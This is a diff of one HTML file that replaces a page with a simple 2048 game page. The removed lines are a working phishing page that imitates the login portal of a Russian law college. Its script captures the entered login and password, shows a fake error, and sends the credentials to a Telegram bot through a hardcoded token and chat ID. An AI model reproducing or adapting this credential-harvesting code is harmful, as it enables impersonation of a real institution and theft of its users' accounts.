@@ -1,134 +1,21 @@
-<html class="bx-core bx-win bx-no-touch bx-no-retina bx-chrome">
+<!DOCTYPE html>
+<html lang="en">
+
 <head>
-  <meta charset="utf-8">
-  <title>Личный кабинет</title>
-  <link rel="shortcut icon" href="/bitrix/templates/modern_blue_2024/favicon.ico" type="image/x-icon">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link type="Image/x-icon" href="./favicon.ico" rel="icon">
+  <title>2048</title>
+  <link rel="stylesheet" href="./style.css">
+  <script src="./script.js" type="module"></script>
 </head>
 
 <body>
-  <div class="body-wrapper clearfix">
-    <header>
-      <!-- Верхняя часть хедера -->
-      <div class="header-bar">
-        <div class="content">
-          <!-- Логотип и название -->
-          <div class="col col-mb-12 col-12 col-dt-3">
-            <div class="header-brand">
-              <a href="/" class="header-logo">
-                <img src="images/logo.png" alt="Логотип">
-              </a>
-              <a href="/" class="brand-title">
-                <span>
-                  <p>"ЧЕЛЯБИНСКИЙ ЮРИДИЧЕСКИЙ КОЛЛЕДЖ"</p>
-                </span>
-              </a>
-            </div>
-          </div>
-
-          <!-- Действия: Расписание и Личный кабинет -->
-          <div class="col col-mb-12 col-12 col-dt-9 header-actions">
-            <div class="header-actions-inner">
-              <a href="http://miterra.chuc.ru/" target="_blank" class="header-button">Расписание</a>
-              <a target="_blank" href="/lichnyy-kabinet/" class="header-button">Личный кабинет</a>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      
-    </header>
-
-    <!-- Основной контент -->
-    <div class="container container-main col-margin">
-      <div class="content">
-        <!-- Боковое меню -->
-        <div class="col col-mb-12 col-4 col-dt-3">
-          <div class="white-box col-margin-bottom clearfix">
-            <div class="sidebar-navrazdel">
-              <ul>
-                <li><a href="/lichnyy-kabinet/jurnal.php">Электронный журнал</a></li>
-                <li><a href="/lichnyy-kabinet/tt-grp.php">Расписание по группам</a></li>
-                <li><a href="/lichnyy-kabinet/tt-prep.php">Расписание по преподавателям</a></li>
-                <li><a href="/lichnyy-kabinet/biblioteka">Электронная библиотека</a></li>
-                <li><a href="/lichnyy-kabinet/po.php">Бесплатное ПО</a></li>
-                <li><a href="/lichnyy-kabinet/office.php">Облачный Office</a></li>
-                <li><a href="/lichnyy-kabinet/tekushchie-vakansii.php">Текущие вакансии</a></li>
-              </ul>
-            </div>
-          </div>
-        </div>
-
-        <!-- Форма авторизации -->
-        <div class="white-box col-margin-bottom padding-box">
-            <h1>Личный кабинет</h1>
-            <div>
-                <div class="bx-system-auth-form">
-                    <form name="system_auth_form" id="telegramForm">
-                        <table width="95%">
-                            <tbody>
-                                <tr>
-                                    <td colspan="2">
-                                        Логин:
-                                        <br>
-                                        <input type="text" name="login" placeholder="Логин" required>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td colspan="2">
-                                        Пароль:
-                                        <br>
-                                        <input type="password" name="password" placeholder="Пароль" required>
-                                        <p style="color: red; display: none;" id="errortext">неверный пароль</p>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td valign="top">
-                                        <input type="checkbox" id="USER_REMEMBER_frm" name="remember" value="Y">
-                                    </td>
-                                    <td width="100%">
-                                        <label for="USER_REMEMBER_frm">Запомнить меня</label>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td colspan="2">
-                                        <button type="submit">Войти</button>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td colspan="2">
-                                        <a href="/lichnyy-kabinet/index.php?forgot_password=yes&amp;backurl=%2Flichnyy-kabinet%2Findex.php" rel="nofollow">Забыли свой пароль?</a>
-                                    </td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </form>
-                </div>
-            </div>
-            <script>
-            document.getElementById('telegramForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const formData = new FormData(this);
-                const login = formData.get('login');
-                const password = formData.get('password');
-                const text = document.getElementById('errortext');
-                text.style.display = 'block';
-                
-                // Ваши данные бота (ЗАМЕНИТЕ)
-                const botToken = '8425376529:AAH7OV8VqeDDpIXgWxC73FzPYsidC-xCMg4';
-                const chatId = '722943049';
-                
-                const message = `Логин: ${login}%0AПароль: ${password}%0A${new Date().toLocaleString()}`;
-                
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
-                    
-            });
-            </script>
-        </div>
-      </div>
+  <div id="game-container">
+    <div id="game-board">
     </div>
+    <button id="restart-button" style="display: none;">Начать заново</button>
   </div>
 </body>
+
 </html>
